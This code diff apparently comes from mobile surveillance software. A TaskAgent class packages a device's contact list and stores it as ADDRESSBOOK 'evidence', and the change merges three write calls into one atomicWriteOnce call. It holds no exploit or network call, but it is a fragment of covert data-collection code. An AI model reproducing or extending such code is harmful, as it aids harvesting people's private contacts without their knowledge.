@@ -599,9 +599,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
             final byte[] payload = getContactPacket(contactList, contact);
 
-            evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
-            evidence.writeEvidence(payload);
-            evidence.close();
+            evidence.atomicWriteOnce(null, EvidenceType.ADDRESSBOOK, payload);
+
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
